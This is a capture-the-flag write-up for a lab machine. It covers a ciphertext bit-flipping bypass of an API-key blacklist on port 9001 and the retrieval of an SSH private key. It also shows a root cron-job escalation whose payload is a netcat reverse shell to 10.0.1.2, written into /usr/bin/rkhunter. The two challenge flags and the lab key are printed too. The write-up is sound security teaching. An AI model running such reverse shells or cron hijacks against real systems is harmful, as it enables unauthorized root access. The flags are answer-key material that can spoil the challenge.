# Nmap

After scanning the machine with nmap, there are 2 ports open: `22` and `9001`.

```bash
nmap --top-ports 1000 10.0.10.97
nmap --top-ports 1000 10.0.10.97 -sV
```

![](screenshots/1.png)

```
PORT     STATE SERVICE
22/tcp   open  ssh
9001/tcp open  tor-orport

PORT     STATE SERVICE
22/tcp open  ssh     OpenSSH 9.0 (protocol 2.0)
```

The service on port `9001` died from the portscan. The machine had to be restarted.

# 9001

There is a text based service on port `9001`. With commands `getFlag` and `getSshKey` some API key and crypto, based on a json.

Based on the examples, `1337` is blacklisted in the `apiKey`. Otherwise we receive a cyphertext, which can be piped back to get the original plaintext (and that our API key is invalid).

![](screenshots/2.png)

After a lot of experimentations, the following can be noted.

 - It is using some IV. Same plaintext results in different cyphertext.
 - Block size is 16.
 - Modifying a byte in the cyphertext is thrashing that block, and rarely a byte in next block, but nothing else.
 - The `apiKey` and `operation` is mandatory, can occur more than once, only the last one is used.
 - The `apiKey` can contain `1337` if it is not the last.
 - Some `comment` keys can be added with arbitrary content, it has no effect.
 - Valid JSON is required.

```json
{"comment":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "apiKey": "", "operation": "getFlag"}  
```

![](screenshots/3.png)

![](screenshots/4.png)

Based on the observations, a JSON can be created with 2 `apiKey`s, where the second one is empty (no `1337`) and can fit in a block, surrounded with comments. It is structured in a way that if the block is thrashed, it should still be a valid JSON, because the garbage will be inside the quotes.

```json
{"apiKey":"1337d74c985b01ab9d4f996690a8dde658ec307313c1a521810bdcff6d964b4e","comment2":"AAAAAAAAA","apiKey":"\"", "commenttttttttt":"","operation": "getFlag"} 
```

Modifying the returned cyphertext byte at offset 218 results in the flag, because the program is using the first `apiKey` now.

![](screenshots/5.png)

# Flag 1
`flag{off_3_8861a4661b4436d2e81165a36adc486c}`

# SSH key
There is a `getSshKey` operation as well. Crafting an input like earlier can use this command.

![](screenshots/6.png)

This is handing out an SSH key for the `node` user.

```
1.	SSH key for the "node" user:
2.	-----BEGIN OPENSSH PRIVATE KEY-----
3.	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
4.	QyNTUxOQAAACCMQVShbnEIsjRAUGUUb5zc93yic5+VZXtYMH4GjrNQLAAAAIhfoqZmX6Km
5.	ZgAAAAtzc2gtZWQyNTUxOQAAACCMQVShbnEIsjRAUGUUb5zc93yic5+VZXtYMH4GjrNQLA
6.	AAAEBw9eew4bjTG894tjjQruEAgtCNUXVRYJuRPsHQzcLt+YxBVKFucQiyNEBQZRRvnNz3
7.	fKJzn5Vle1gwfgaOs1AsAAAAAAECAwQF
8.	-----END OPENSSH PRIVATE KEY----- 
```

Not every client likes this format, so it was converted via `putty`. Import key then Export OpenSSH key (force new file format). This is compatible with my client.

![](screenshots/7.png)

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
c2gtZWQyNTUxOQAAACCMQVShbnEIsjRAUGUUb5zc93yic5+VZXtYMH4GjrNQLAAA
AJAvteWYL7XlmAAAAAtzc2gtZWQyNTUxOQAAACCMQVShbnEIsjRAUGUUb5zc93yi
c5+VZXtYMH4GjrNQLAAAAEBw9eew4bjTG894tjjQruEAgtCNUXVRYJuRPsHQzcLt
+YxBVKFucQiyNEBQZRRvnNz3fKJzn5Vle1gwfgaOs1AsAAAAAAECAwQFBgcICQoL
DA0=
-----END OPENSSH PRIVATE KEY----- 
```

This can be used to SSH into the other open port.

```bash
ssh -i /tmp/ssh.key node@10.0.10.97 
```

# Cron

There is a cron job running as root that runs a binary that can be modified by anyone. It runs every minute.


![](screenshots/8.png)

Writing our code into the binary is running it as root on the next attempt.

```
echo '#!/bin/sh' >> rkhunter
echo 'nc 10.0.1.2 4444 -e /bin/bash' >> rkhunter
chmod 777 rkhunter
cat ./rkhunter > /usr/bin/rkhunter 
```

![](screenshots/9.png)

The flag is not a txt, but a binary, running it outputs the flag. It is checking a few things (for example password hash for root), so the easiest is running it on the machine itself.

![](screenshots/10.png)

# Flag 2
`flag{off_4_e946801225142d40d50d416e3a77d6d9}`
